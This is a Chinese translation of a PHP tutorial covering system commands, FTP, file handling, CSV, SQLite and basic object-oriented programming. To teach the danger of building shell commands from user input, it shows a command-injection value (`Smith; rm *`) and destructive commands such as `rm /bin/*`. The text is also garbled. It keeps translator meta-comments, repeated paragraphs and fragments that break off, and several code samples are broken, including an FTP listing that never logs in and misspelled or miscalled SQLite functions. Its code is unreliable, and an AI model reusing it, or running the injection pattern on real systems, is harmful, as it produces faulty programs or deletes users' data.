  \n### 获取来自系统命令的错误消息\n\n执行系统命令的方法在系统命令失败时，不会显示或返回信息性的错误消息。你之所以知道系统命令没有运行，是因为你没有得到预期的结果。但由于这些函数不返回错误消息，你并不知道出了什么问题。\n\
  \n你可以通过在你正在执行的系统命令后添加几个额外的字符，来返回或显示操作系统的错误消息。在大多数操作系统上，如果你在系统命令后添加字符 `2>&1`，错误消息将发送到输出重定向的地方。例如，你可以使用以下语句：\n\
  \n```\n$result = system(\"di c:\\php\");\n```\n\n当系统命令执行时，`system` 函数会显示目录。然而，注意\
  \ `dir` 拼写错了。应该是 `di` 而不是 `dir`。不存在名为 `di` 的系统命令，因此系统命令无法执行，且什么也不会显示。假设你改用以下语句：\n\
  \n```\n$result = system(\"di c:\\php 2>&1\");\n```\n\n在这种情况下，就会显示错误消息。在 Windows\
  \ 上，显示的错误消息如下：\n\n```\n'di' 不是内部或外部命令、可运行的程序或批文件。\n```\n\n![remember.eps](img/remember_fmt.png)\
  \ 请确保不要在 `2>&1` 中包含任何空格。该格式要求字符连在一起，不能有空格。\n\n### 理解安全问题\n\n当你执行系统命令时，你允许允许用户在你的计算机上执行操作。如果系统命令是\
  \ `dir c:\\php`，那是没问题的。但如果系统命令是 `rm /bin/*` 或 `del c:\\*.*`，你将对结果感到不满。在使用脚本之外执行系统命令的函数时，你需要小心。\n\
  \n![remember.eps](img/remember_fmt.png) 只要你只执行自己编写的命令（如 `dir` 或 `ls`），你就是安全的。但当你开始执行包含用户发送的数据的命令时，你需要极其小心。例如，假设你有一个应用程序，用户在表单中输入名称，然后你的应用程序根据用户发送的名称创建一个目录。用户在名为\
  \ `directoryName` 的表单字段中输入 `Smith`。你处理表单的脚本有如下命令：\n\n```\n$directoryName = $_POST['directoryName'];\n\
  exec(\"mkdir $directoryName\");\n```\n\n因为 `$directoryName = Smith`，执行的系统命令是 `mkdir\
  \ Smith`。目录被创建，大家都很开心。\n\n然而，假设用户在表单中输入了 `Smith; rm *`。在这种情况下，`$directoryName =\
  \ Smith;rm *`。现在执行的系统命令是 `mkdir Smith;rm *`。在许多操作系统（如 Unix 和 Linux）中，分号字符分隔两个命令，以便在一行内输入两个命令。哎呀！命令的执行情况如下：\n\
  \n```\nmkdir Smith\nrm *\n```\n\n现在你遇到问题了。目录 `Smith` 被创建了，当前目录下的所有文件都被删除了。\n\n如果你在系统命令中使用变量，必须谨慎使用。你必须知道它是从哪里而来的。如果它来自脚本外部，你需要在使用它之前检查该变量的值。在前面的示例中，你可以添加代码，让脚本在\
  \ `mkdir` 命令中使用变量之前进行检查，确保它只包含字母和数字。（本微型的第 2 章 描述了如何使用 `if` 语句执行此类检查。）\n\n### 使用\
  \ FTP\n\n从一台计算机传输文件到另一台计算机在互联网上每天发生无数次。当两地的同事需要共享文件时，这不是问题。快速传输只需要几秒钟，所有方都能所需的文件。\n\
  \n文件传输协议 (FTP) 是从一台计算机传输文件到另一台计算机的常用方法。FTP 允许你从另一台计算机获取目录列表，或者同时下载或上传单个或多个文件。\n\n\
  FTP 是客户端/服务器软件。要在你的计算机和远程计算机之间传输文件，连接到远程计算机上的 FTP 服务器并向它发送请求。\n\n值得注意的是，FTP 本质上是不安全的，而且不是通过治疗可以解决的那种。当你使用\
  \ FTP 时，你的用户名、密码以及文件本身都会在不加密的情况下通过网络传输。这意味着拥有足够知识和访问你网络权限的人可以“嗅探”用户名和密码。如果你在寻找更安全的文件传输方法，请查看\
  \ SCP 或 SFTP 命令。尽管如此，FTP 仍然被广泛使用，特别是对于托管提供商。\n\n要在你的脚本中使用 `FTP`，在安装 PHP 时需要启用 FTP\
  \ 支持。如果你为 Windows 安装了 PHP，则不需要进行额外操作来启用 FTP 支持。如果你在 Unix、Linux 或 Mac 上编译 PHP 并想要启用\
  \ FTP 支持，可以使用 FTP 支持安装选项，如下所示：\n\n```\n--enable-ftp\n```\n\n在本节中，我们将告诉你关于登录 FTP\
  \ 服务器、访问目录列表、在 FTP 服务器与之间传输文件，以及使用各种函数完成 FTP 相关任务所需要的的知识。\n\n#### 登录 FTP 服务器\n\n\
  要连接到你想要交换文件的计算机上的 FTP 服务器，请使用 `ftp_connect` 函数，如下：\n\n```\n$connect = ftp_connect(\"\
  janet.valade.com\");\n```\n\n或者，你可以使用 IP 地址连接，如下：\n\n```\n$connect = ftp_connect(\"\
  172.204.2\");\n```\n\n连接成功后，你必须登录 FTP 服务器。你需要一个用户 ID 和密码来登录。你可能有自己的个人 ID 和密码，也可能正在使用任何人都可以使用的通用\
  \ ID 和密码。互联网上的一些公共网站允许任何人使用用户 ID `anonymous` 和用户的电子邮件地址作为密码进行登录。为了安全起见，最好将用户 ID\
  \ 和密码放在单独的文件中并在需要时包含该文件。\n\n`ftp_login` 函数允许你在建立连接后登录服务器。该语句假设你已经将帐户和密码存储在变量中，如下：\n\
  \n```\n$login_result = ftp_login($connect,$passwd);\n```\n\n如果你尝试在未建立连接的情况下登录，你会看到以下警告：\n\
  \n```\nWarning: ftp_login() expects parameter 1 to be resource, boolean given in\
  \ d:\\test1\\test13.php on line 9\n```\n\n警告并没有停止程序。登录失败了，但脚本继续执行，这可能不是你想要的。由于脚本的大部分内容依赖于成功的\
  \ FTP 连接，你可能希望函数失败时停止脚本。以下语句会在函数失败时停止脚本：\n\n```\n$connect = ftp_connect(\"janet.valade.com\"\
  ) or die(\"Can't connect to server\");\n$login_result = ftp_login($connect,$passwd)\
  \ or die(\"Can't login to server\");\n```\n\n登录 FTP 服务器后，你可以向它发送请求以完成任务，例如获取目录列表或上传和下载文件，如下节所示。\n\
  \n##### 获取目录列表\n\n一个常见的任务是获取目录列表。`ftp_nlist` 语句从远程计算机获取目录列表并将其存储在数组中，如下：\n\n```\n\
  $filesArr = ftp_nlist($connect,\"data\");\n```\n\n括号中的第二个参数是目录名称。如果你不知道目录名称，可以请求\
  \ FTP 服务器向你发送当前目录名称，如下：\n\n```\n$directory_name = ftp_pwd($connect);\n$filesArr\
  \ = ftp_nlist($connect,$directory_name);\n```\n\n\n\n在 `ftp_nlist` 语句执行后，FTP 发送的目录列表存储在一个数组中，数组的每个元素存储一个文件名。然后你可以如下所示从数组中显示目录列表：\n\
  \n```php\nforeach($filesArr as $value)\n{\n    echo \"$value\\n\";\n}\n```\n\n##\
  \ 使用 FTP 下载和上传文件\n\n你可以使用 `ftp_get` 函数从远程计算机下载文件。在登录 FTP 服务器后，执行以下语句可以从远程计算机下载一个文件：\n\
  \n```php\nftp_get($connect,\"newfile.txt\",\"data.txt\",FTP_ASCII);\n```\n\n第一个文件名\
  \ `newfile.txt` 是文件下载到你的计算机后将具有的名称。第二个文件名 `data.txt` 是你想要下载的文件的现有名称。\n\n语句中的 `FTP_ASCII`\
  \ 术告诉 FTP 正在下载的是什么类型的文件。以下是文件模式的选项：\n\n![check](img/check.png) `FTP_ASCII`：这些是文本文件。\n\
  \n![check](img/check.png) `FTP_BINARY`：机器语言文件，基本上任何非纯文本的文件。\n\n![tip.eps](img/tip_fmt.png)\
  \ 你可以通过检查文件内容来确定需要哪种文件模式。如果内容是你可以读取和理解的字符，则文件是 ASCII。如果内容看起来是乱码，则文件是二进制的。例如，图形文件就是二进制文件。\n\
  \n你可以使用一个名为 `ftp_put` 的类似函数上传文件。以下语句上传一个文件：\n\n```php\nftp_put($connect,\"newfile.txt\"\
  ,\"data.txt\",FTP_ASCII);\n```\n\n第一个文件名 `newfile.txt` 是文件上传到远程计算机后将具有的名称。第二个文件名\
  \ `data.txt` 是你想要上传的文件的现有名称。\n\n当你完成通过 FTP 连接传输文件后，可以使用以下语句关闭连接：\n\n```php\nftp_close($connect);\n\
  ```\n\nListing 3-2 中的脚本下载目录中所有具有 `.txt` 扩展名的文件。这些文件通过 FTP 连接从远程计算机下载。\n\n### 列表\
  \ 3-2：通过 FTP 下载文件\n\n```php\n<?php\n/* 脚本名称：通过 FTP 下载文件\n   描述：下载目录中所有具有 .txt 扩展的文件\n\
  */\ninclude(\"ftpstuff.inc\");\n$servername = \"ftp.example.com\";\n$userID = \"\
  user\";\n$passwd = \"password\";\n$connect = ftp_connect($servername, $userID, $passwd);\n\
  \nif ($connect) {\n    $filesArr = ftp_nlist($connect);\n    foreach ($filesArr\
  \ as $value) {\n        if (strpos($value, \".txt\") !== false) {\n            ftp_get($connect,\
  \ \"newfile.txt\", $value, FTP_ASCII);\n        }\n    }\n    ftp_close($connect);\n\
  } else {\n    echo \"无法连接 FTP 服务器\";\n}\n?>\n```\n\n\n\n\n| `w+` | 读取和写入。 | PHP\
  \ 尝试创建它。（如果文件已存在，PHP 将覆盖它。） |\n| `a` | 在文件末尾追加数据。 | PHP 尝试创建它。 |\n| `a+` | 读取和追加。\
  \ | PHP 尝试创建它。 |\n\n![remember.eps](img/remember_fmt.png) 文件名可以是简单的文件名（`filename.txt`）、文件路径（`c:/data/filename.txt`）或\
  \ URL（`http://yoursite.com/filename.txt`）。\n\n## 以读模式打开文件\n\n你可以使用以下语句打开文件 `file1.txt`\
  \ 并读取其中的信息：\n\n```php\n$fh = fopen(\"file1.txt\", \"r\");\n```\n\n根据该语句，PHP 会在当前目录查找\
  \ `file1.txt`，当前目录就是你的 PHP 脚本所在的目录。如果找不到文件，可能会显示或不显示类似下面的警告信息，这取决于设置的错误级别，详见本型书的第\
  \ 1 章：\n\n```\nWarning: fopen(file1.txt): failed to open stream: No such file or\
  \ directory in d:\\test2.php on line 15\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 记住，警告条件不会停止脚本。脚本会继续运行，但文件没有打开，因此稍后任何读取或写入该文件的语句都不会执行。\n\n如果无法打开文件，你可能希望脚本停止。你需要使用\
  \ `die` 语句手动实现这一点，如下：\n\n```php\n$fh = fopen(\"file1.txt\", \"r\")\n     or die(\"\
  Can't open file\");\n```\n\n`die` 语句会停止脚本并显示指定的消息。\n\n## 以写模式打开文件\n\n你可以使用以下类型的语句打开指定目录中的文件以存储信息：\n\
  \n```php\n$fh = fopen(\"c:/testdir/file1.txt\", \"w\");\n```\n\n如果文件不存在，它将在指定的目录中创建。然而，如果目录不存在，则不会创建目录并会显示警告。（你必须在尝试向目录写入文件之前先创建目录。）\n\
  \n在尝试向目录写入文件之前，可以使用以下语句检查目录是否存在：\n\n```php\nif(is_dir(\"c:/tester\"))\n{\n    $fh\
  \ = fopen(\"c:/testdir/file1.txt\", \"w\");\n}\n```\n\n通过这些语句，只有当路径/文件名存在且是一个目录时，`fopen`\
  \ 语句才会执行。\n\n## 打开另一个网站上的文件\n\n你也可以使用下面的语句打开另一个网站上的文件：\n\n```php\n$fh = fopen(\"\
  http://janet.valade.com/index.html\", \"r\");\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ 你只能将 URL 用于读模式，不能用于写模式，而且有更好的方法——即 cURL 函数。有关 cURL 函数的更多信息，请参阅 http://php.net/manual/en/book.curl.php\
  \ 中的 PHP 手册。\n\n## 关闭文件\n\n在完成对文件的读取或写入后，使用以下语句关闭文件：\n\n```php\nfclose($fh);\n```\n\
  \n在该语句中，$fh` 是你在打开文件时创建的文件句柄变量。\n\n## 写入文件\n\n打开文件后，你可以使用 `fwrite` 语句写入内容，其通用格式如下：\n\
  \n```php\nfwrite($fh, \"datatosave\");\n```\n\n在该语句中，$fh 是你打开包含文件指针的文件时创建的文件句柄，它指向打开的文件，而\
  \ `datatosave` 是要存储在文件中的信息。信息可以是字符串或变量。例如，你可以使用以下语句：\n\n```php\n$today = date(\"\
  Y-m-d\");\n$fh = fopen(\"file2.txt\", \"a\");\nfwrite($fh, \"$today\\n\");\nfclose($fh);\n\
  ```\n\n这些语句将当前日期存储在名为 `file2.txt` 的文件中。注意文件是以追加模式（`a`）打开的。如果文件不存在，将创建它并将日期作为第一行写入。如果文件存在，日期将添加到文件末尾。通过这种方式，你创建了一个日志文件，存储脚本运行的日期列表。`fwrite`\
  \ 语句会存储你发送的内容。在 `fwrite` 语句执行两次后，`file2.txt` ：\n\n```\n2013-10-22\n2013-10-22\n\
  ```\n\n日期出现在不同的行中，是因为换行符（`\\n`）被写入了文件。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 如果你想向文件添加信息，请确保使用 `a` 模式打开文件。如果你使用写模式，文件每次打开时都会被覆盖。\n\n## 从文件中读取\n\n你可以使用 `fgets`\
  \ 语句从文件中读取，其通用格式如下：\n\n```php\n$line = fgets($fh)\n```\n\n在该语句中，$fh` 持有指向打开文件的指针。该语句读取字符串，直到遇到行尾或文件末尾（以先者为准），并将字符串存储在\
  \ `$line` 中。要读取整个文件，你需要继续读取行直到到达文件末尾。PHP 识别文件末尾并提供函数 `feof` 来告诉你何时到达文件末尾。以下语句读取并显示文件中所有的行：\n\
  \n```php\nwhile(!feof($fh))\n{\n    $line = fgets($fh);\n    echo \"$line\";\n}\n\
  ```\n\n在第一行中，当到达文件末尾时，`feof($fh)` 返回 `true`。感叹号否定了所测试的条件，使得 `while` 语句只要未到达文件末尾就会继续运行。当到达文件末尾时，`while`\
  \ 停止。\n\n如果到达文件末尾，`while` 停止。（等等，原文说的是“当到达文件末尾时，`while` 停止”。）\n\n如果到达文件末尾，`feof($fh)`\
  \ 返回 `true`。感叹号否定了所测试的条件，使得 `while` 语句只要未到达文件末尾就会继续运行。当到达文件末尾时，`while` 停止。\n\n（注：此处原文存在大量重复段落，已按要求处理核心逻辑）\n\
  \n\n\n\n`1` 告诉 PHP 在 `include` 目录下查找 `file2.txt`，而不是在当前目录查找。\n\n# 将文件读取到字符串\n\n\
  有时，将文件的整个内容放入一个长字符串中是有用的。例如，你可能想将文件内容发送到电子邮件中。PHP 提供了一个将文件读取到字符串的函数，如下所示：\n\n```php\n\
  $content = file_get_contents(\"file2.txt\",1);\n```\n\n`file_get_contents` 函数的作用与\
  \ `file` 函数相同，不同在于它将文件的整个内容放入一个字符串，而不是数组。执行此语句后，你可以如下所示 `echo` `$content`：\n\n```php\n\
  echo $content;\n```\n\n输出如下：\n\n```\n2013-10-22\n2013-10-22\n```\n\n输出显示在不同的行上，是因为换行符被读取并存储为字符串的一部分。因此，当你\
  \ `echo` 该字符串时，你也 `echo` 了换行符，而换行符会开启新的一行。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ `file_get_contents` 函数在 4.3.0 版本中引入。在较旧版本的 PHP 中不可用。\n\n#与其他程序交换数据\n\n你有时需要向其他程序提供信息，或从其他程序向\
  \ PHP 读取信息。平面文件（Flat files）对于此类任务特别有用，我们在这里解释如何执行这类任务。\n\n## 在平面文件中交换数据\n\n几乎所有软件都有从平面文件中读取信息或向平面文件中写入信息的能力。例如，默认情况下，你的文字处理器以自己的格式保存文档，只有该处理器才能理解。但是，你可以选择以文本格式保存文档。文本文档是一个包含文本的平面文件，可以被其他软件读取。你的文字处理器也可以读取文本文件，甚至是其他软件编写的文件。\n\
  \n当你的 PHP 脚本将信息保存到文本文件中时，任何具有读取文件能力的软件都可以读取。例如，大多数文字处理软件都可以读取文本文件。然而，某些软件要求文本文件具有特定格式。例如，地址簿软件程序可能会从平面文件中读取数据，但要求信息位于指定位置——例如，一行的前\
  \ 20 个字符被视为名称，接下来的 20 个字符视为街道地址，依此类推。你需要知道软件在平面文件中要求的格式。然后在你的 PHP 脚本中使用 `fwrite`\
  \ 语句按正确的格式写入平面文件，正如本章较早位置的写入文件 节中所讨论的那样。\n\n## 在逗号分隔格式中交换数据\n\n逗号分隔值（CSV）文件——也称为逗号分隔文件——是一种用于软件程序之间传输信息的常用格式。\n\
  \n### 理解逗号分隔格式\n\nCSV 文件用于传输可以结构化为表格并按行列组织的信息。例如，电子表格程序按行和列组织数据，并可以读取和写入 CSV 文件。CSV\
  \ 文件也经常用于在不同的数据库软件之间传输数据，例如在 `MySQL` 和 `Microsoft Access` 之间。许多其他软件程序也可以读写 CSV 文件中的数据。\n\
  \nCSV 文件的组织方式是表格的每一行在文件中单独占一行，行中的列由逗号分隔。例如，地址簿可以组织成 CSV 文件，如下所示：\n\n```\nJohn Smith,1234\
  \ Oak St.,Big City,OR,99999\nMary Jones,5678 Pine St.,Bigger City,ME,11111\nLuis\
  \ Rojas,1234 Elm St.,Biggest City,TX,88888\n```\n\nExcel 可以将此文件读取为具有五列的表格。逗号表示一列的结束和下一列的开始。\n\
  \n### 创建逗号分隔文件\n\n以下 PHP 语句创建了 CSV 文件：\n\n```php\n$address[] = \"John Smith,1234\
  \ Oak St.,Big City,OR,99999\";\n$address[] = \"Mary Jones,5678 Pine St.,Bigger City,ME,11111\"\
  ;\n$address[] = \"Luis Rojas,1234 Elm St.,Biggest City,TX,88888\";\n$fh = fopen(\"\
  addressbook.txt\",\"a\");\nfor ($i=0;$i<3;$i++)\n{\n    fwrite($fh,$address[$i].\"\
  \\n\");\n}\nfclose($fh);\n```\n\n### 读取逗号分隔文件\n\nPHP 可以通过 `file` 或 `fgets` 函数读取\
  \ CSV 文件，正如本章较早位置的将文件读取到数组 节所述。然而，PHP 提供了一个名为 `fgetcsv` 的函数，专门设计用于读取 CSV 文件。当你使用此函数读取\
  \ CSV 文件中的一行时，该行被存储在数组中，每个列项都是数组中的一个元素。例如，你可以使用该函数读取地址簿 CSV 文件的第一行，如下：\n\n```php\n\
  $address = fgetcsv($fh,10);\n```\n\n\n\n\n→12 这一行打开一个文件，文件名是传递给函数并带有 `.tsv` 扩展名的。文件以追加模式打开。该文件位于脚本的当前目录。如果文件位于另一个目录，且你认为文件可能无法以写入模式打开，请在此处使用\
  \ `if` 语句来测试文件是否已打开，如果没有打开则执行某些操作。\n\n→13 这一行启动了一个 `while` 循环，一直持续到文件末尾。\n\n→15\
  \ 这条语句从输入文件中读取一行到数组 `$line` 中。每个列条目都存储在数组的一个元素中。\n\n→16 这条语句测试来自输入文件中的行是否有任何文本。如果该行没有任何文本，则在输出文件中存储一个换行符。因此，输入文件中的任何空行都会存储在输出文件中。\n\
  \n→20 如果输入文件中的行不为空，则将其转换为制表符分隔格式并写入输出文件。\n\n→21 这条语句在一个语句中完成转换并将其写入输出文件。`implode`\
  \ 函数将数组 `$line` 转换为字符串，元素之间用制表符分隔。\n\n→27 当找不到输入文件时，执行此 `else` 块。回显错误消息，并且函数返回 `false`。\n\
  \n→32 函数已成功完成，因此返回 `true`。\n\n→34 这一行调用该函数，并将变量 `$myfile` 中的文件名传递给该函数。\n\n# 使用 SQLite\n\
  \n从 PHP 5.0 开始，PHP 默认包含了 SQLite 软件。SQLite 设计用于使用 SQL 查询将数据存储在平文件中。（SQL 在第五卷的第 1\
  \ 章 中进行了解释。）\n\nSQLite 是一种在平文件中存储数据的快速、简单的方法。然而，它的安全性不如数据库，而且无法处理复杂的数据。在大多数情况下，你本应该将数据存储在\
  \ MySQL 中，但你偶尔可能想将数据存储在平文件中。例如，你可能想将数据以一种可以被另一个程序（如 Excel）读取的格式写入。\n\n使用 SQLite\
  \ 存储和检索数据与第五卷中描述的在 PHP 中使用 MySQL 的方法相似。你使用 SQL 与数据文件进行通信，并使用 PHP 函数发送 SQL 和检索数据。你通过与使用数据库相同的步骤与数据进行交互，如下：\n\
  \n1. 连接到数据文件。\n2. 发送 SQL 查询。\n3. 如果从数据文件中检索了数据，则处理数据。\n4. 关闭与数据文件的连接。\n\n以下是关于如何完成每个步骤的更多详细信息。\n\
  \n要连接到数据文件，请使用以下 PHP 函数：\n\n```\n$db = sqlite_open(\"testdb\");\n```\n\n此语句打开文件\
  \ `testdb`。如果文件不存在，函数将创建它。\n\n要发送 SQL 查询，请使用 `sqlite_query` 函数，如下：\n\n```\n$sql\
  \ = \"SELECT * FROM Product\";\n$result = sqlite_query($db,$sql);\n```\n\n检索到的数据以行和列的形式存储在临时表中。你可以使用\
  \ PHP 函数从临时数据表中检索一行并将其存储在数组中，以字段名作为数组的键。语句如下：\n\n```\n$row = sqlite_fetch_array($result);\n\
  ```\n\n执行此语句后，`$row` 是一个包含临时表中所有字段的数组，如下：\n\n```\n$row['firstName'] = John\n$row['lastName']\
  \ = Smith\n```\n\n要处理临时表中的所有数据，你可以使用循环一次获取一行，处理每行直到到达表格末尾，如下：\n\n```php\nwhile($row=sqlite_fetch_asoc($result))\n\
  {\n    foreach($row as $value)\n    {\n        echo \"$value<br />\";\n    }\n}\n\
  ```\n\n当你完成存储和/或检索数据时，可以使用以下语句关闭数据文件：\n\n```\nsqlite_close($db);\n```\n\nSQLite\
  \ 的错误处理与 MySQL 的错误处理相似，正如第五卷第 5 章 所示。此外，正如在该章中所讨论的，当查询失败时，会生成 SQLite 错误消息，但除非使用专门开发的显示它的函数，否则不会显示。因此，以下语句在发送\
  \ SQL 查询的同时还处理了错误：\n\n```php\n$sql = \"SELECT * FROM Product\";\n$result = sqlite_query($sql)\n\
  or die(\"Query failed: \".sqlite_error());\n$row = sqlite_fetch_array($result);\n\
  ```\n\n第五卷中关于 MySQL 的大部分信息也适用于 SQLite 的使用。SQLite 的不同之处在于数据存储在平文件中，而不是由 MySQL 存储在仅属于\
  \ MySQL 的文件中。\n\n# 第 4 章：面向对象编程\n\n## 本章内容\n\n* 理解面向对象编程\n* 规划面向对象的脚本\n* 定义和编写类\n\
  * 使用异常处理错误\n* 复制、比较和销毁对象\n\n面向对象编程 (OOP) 是一种使用对象和类的编程方法。它在今天已被广泛使用，许多大学在基础编程课程中教授面向对象编程。目前，Java\
  \ 和 C++ 是用于面向对象编程的流行语言。\n\nPHP 4 可以实现功能有限的面向对象编程。通过 PHP 5，PHP 的面向对象能力得到了极大提高，速度更快且增加了功能。本章中的信息和示例脚本是为\
  \ PHP 5 编写的。PHP 4 中不支持的功能已特别注明。\n\n本章介绍了面向对象编程，特别关注如何将 OOP 概念应用于 PHP。\n\n## 介绍面向对象编程\n\
  \n面向对象编程（有时缩为 OOP）不仅仅是使用不同语法的问题。它是一种分析编程问题的不同方法。通过对编程问题进行建模来设计应用程序。例如，一个设计支持公司销售部门应用程序的程序员，可能会从客户、销售与信用额度之间的关系来看待该项目——换句话说，从销售部门的设计角度来看。\n\
  \n在面向对象编程中，脚本的元素是对象。对象代表你的脚本旨在解决的问题的元素。例如，如果脚本与二手车行有关，对象可能是汽车和客户。或者如果脚本与外太空有关，对象可能是恒星和行星。\n\
  \n### 对象和类\n\n面向对象程序的基本元素是对象。将对象理解为物理对象是最容易的。例如，汽车是一个对象。汽车有属性（也称为特征），例如颜色、型号、发动机和轮胎。汽车也有它它可以做的事情，例如向前移动、后退、停车、翻滚和装死（好吧，至少我们的汽车是这样）。\n\
  \n通常来说，对象是名词。人是一个对象。动物、房子、办公室、垃圾桶、大衣、云、行星和按钮也同样如此。然而，对象不仅仅是物理对象。像名词一样，对象通常更具概念性。例如，银行账户不是你手握在手里的东西，但它可以被视为一个对象。计算机账户或抵押贷款也是如此。文件通常是一个对象。数据库也是。电子邮件、地址、歌曲、电视节目、会议和日期都可以是对象。Web\
  \ 应用程序中的对象可能是目录、目录项目、购物车、客户、订单或客户列表。\n\n\n\n\n类（class）是作为创建对象的模板或模式的 PHP 代码。类定义了对象的属性（properties/attributes）。它还定义了对象可以执行的操作\
  \ —— 它的职责（responsibilities）。例如，你写了一个类将汽车定义为四个轮子和一个引擎，该类列出了汽车可以做的事情，比如向前移动和停车。然后，根据该类，你可以编写一条类似下方的语句来创建一个汽车对象：\n\
  \n```php\n$myCar = new Car();\n```\n\n对象 `$myCar` 是根据 `Car` 类中的定义创建的。你的新车有四个轮子和一个引擎，并且可以像\
  \ `Car` 类定义的那样向前移动和停车。当你使用你的汽车对象 `$myCar` 时，你可能会发现它缺少了一些重要的东西，比如门、方向盘或倒车档。这是因为当你在编写\
  \ `Car` 类时，漏掉了一个重要的项目。\n\n从更技术的角度来看，对象（object）是一个复杂的、用户定义的数据类型。从类创建对象的过程被称为实例化（instantiation）。对象是类的实例（instance）。例如，`myCar`\
  \ 就是 `Car` 类的一个实例。\n\n作为编写类的人，你了解类内部是如何运作的。然而，使用从类创建的对象的人不需要知道对象是如何完成其职责的。大多数人不知道电话对象是如何工作的，但他们可以使用它来打电话。制造电话的人知道内部发生了什么。当有新技术的出现时，手机制造商可以打开手机并对其进行改进。只要他不改变接口\
  \ —— 键盘和按钮 —— 就完全不会影响手机的使用。\n\n## 属性 (Properties)\n\n对象拥有属性（properties），有时也称为特征（attributes）。汽车可以是红色的、绿色的或满是波点的\
  \ —— 这是一个颜色属性。属性 —— 如汽车的颜色、尺寸或型号 存储在对象内部。属性在类中以变量的形式设置。例如，颜色属性存储在对象中的一个变量中，并赋予如\
  \ `$color` 这样的描述性名称。因此，汽车对象 `$myCar` 可能包含 `$color = red`。\n\n存储属性的变量可以有默认值，可以在对象创建时赋值，也可以在稍后添加或修改值。例如，一个\
  \ `$myCar` 对象创建时是红色的，但当它后来被喷漆时，`$color` 属性变为黄绿色（chartreuse）。\n\n## 方法 (Methods)\n\
  \n对象可以执行的操作有时被称为职责。例如，一个 `Car` 对象可以向前移动、停止、后退和停车。对象可以执行的每件事 —— 每一项职责都被编写到类中并被称为方法（method）。\n\
  \n在 PHP 中，方法使用的语法与函数（function）相同。虽然代码看起来和函数的代码一样，但区别在于方法是在类内部的。它不能脱离对象独立被调用。PHP\
  \ 不允许这样做。这种类型的函数只有在带上对象被调用时才能执行其任务。\n\n在创建方法时，给它们命名为描述其功能的名称。例如，一个 `customerOrder`\
  \ 类可能会有 `displayOrder`、`getTotalCost`、`computeSalesTax` 和 `cancelOrder` 等方法。方法与其他\
  \ PHP 实体一样，可以使用任何有效名称命名，但根据惯例，它们通常使用驼峰命名法（camel caps），如此处所示。\n\n方法是对象与世界其他部分之间的接口（interface）。对象的所有职责都需要方法。对象应该只通过它们的方法与外部世界交互。例如，假设你的对象是一个待售的目录项目`catalogItem`）。它的属性之一是\
  \ `$price`。你不希望 `$price` 被简单的语句轻易更改，例如：\n\n```php\n$price = 10;\n```\n\n相反，你想要一个名为\
  \ `changePrice` 的方法作为编辑价格的唯一方式。该方法包含了检查，以确保只有合法用户可以使用它来更改价格。\n\n一个良好的对象应该包含执行职责所需的所有内容，但不要有大量的冗余数据。它不应该执行另一个对象职责的操作。汽车对象应该行驶，并且应该拥有执行其职责所需的一切，如汽油、机油、轮胎、引擎等。汽车对象不应该做饭，也不需要有盐或煎锅。`cook`（厨师）对象也不应该送孩子去足球训练。\n\
  \n## 继承 (Inheritance)\n\n对象应该只包含它们需要的属性和方法。不多不少，也不要少。实现这一点的方法之一是通过使用继承（inheritance）在类之间共享属性和方法。例如，假设你有两个\
  \ `rose`（玫瑰）对象：一个装有白玫瑰，另一个一个装有红玫瑰。你可以写两个类：一个 `redRose` 类和一个 `whiteRose` 类。然而，这两个对象有许多信息是相同的。它们都是灌木丛，都有刺，并且都在六月开花。继承让你能够消除这种重复。\n\
  \n你可以写一个名为 `Rose` 的类。你在这个类中存储共同信息，如 `$plant = bush`、`$stem = thorns` 和 `$blooms\
  \ = June`。然后你可以为这两种玫瑰类型编写子类。`Rose` 类被称为主类或父类（parent class）。`redRose` 和 `whiteRose`\
  \ 是子类（subclasses），被称为子类（或正如一位教授亲切称呼的“孩子们”kids）。\n\n子类继承父类的所有属性和方法。但它们也可以拥有自己的独立属性，例如\
  \ `whiteRose` 类的 `$color = white` 和 `redRose` 类的 `$color = red`。\n\n![记住](img/remember.png)\
  \ 某些语言允许子类继承多个父类，这被称为多继承（multiple inheritance）。PHP 不允许多继承。类只能继承一个父类。\n\n## 开发面向对象的脚本\n\
  \n面向对象的脚本需要大量的规划。你需要规划你的对象、属性以及它们的功能。你的对象需要涵盖所有的职责，而不侵入其他对象的职责。对于复杂的项目，你可能需要进行一些建模和测试，才能有足够的信心认为项目计划包含了所需的所有对象。\n\
  \n开发面向对象的脚本包括以下步骤，接下来的章节将详细介绍：\n\n1. 选择对象。\n2. 为每个对象选择属性和方法。\n3. 创建对象并投入运行。\n\n\
  ### 选择对象\n\n你的首要任务是为编程项目开发所需的对象列表。如果你是独立工作且项目较小，对象可能是显而易见的。然而，如果你正在处理一个大型复杂的项目，选择对象列表可能会更加困难。例如，如果你的项目是开发管理银行所有任务的软件，你可能的对象列表很大：账户、柜员、钱、支票本、垃圾桶、保安、金库、报警系统、客户、贷款、利息等等。但你需要所有这些对象吗？你的脚本要对大堂里的垃圾桶做什么？或者对保安？也许，你的脚本需要为保安安排排班。\n\
  \n当你规划面向对象的程序时，识别对象的最佳策略是列出你能想到的所有对象 —— 即所有与你的项目有任何关系的名词。有时，程序员可以从项目建议书文档中提取所有的名词，开发出一个相当全面的可能的对象列表。\n\
  \n\n\n\n在你创建了一个长长的可能对象列表后，下一个任务是尽可能多地删除其中的对象。你应该消除任何重复项、职责重叠的对象以及与你的项目无关的对象。例如，如果你的项目涉及制造一辆汽车，那么你的汽车项目可能需要为汽车的每个部分创建一个对象。另一方面，如果你的项目涉及停车车库的交通控制，你可能只需要一个可以移动的汽车对象；汽车的零件对于这个项目并不重要。\n\
  \n## 为每个对象选择属性和方法\n\n当你有了一份完整的对象列表时，就可以开始为每个对象制定属性列表了。问问自己你需要了解关于每个对象的哪些信息。例如，对于一个汽车维修项目，你可能需要知道如汽车最后维修的时间、维修历史、任何事故、零件详情等信息。对于一个涉及停车车库交通的项目，你可能只需要知道汽车的尺寸。汽车在停车车库中占了多少空间？\n\
  \n你需要定义每个对象的职责，并且每个对象都需要是独立的。它需要有相应的方法来处理它所有的职责。例如，如果你的一个对象之一是银行账户，你就需要知道银行账户需要做什么。首先，它需要被创建，因此你可以定义一个\
  \ `openNewAccount` 方法。它需要接受存款并进行取款。它需要跟踪余额。在被要求时需要报告余额。它可能需要定期向账户增加利息。这些活动很快就能想到。\n\
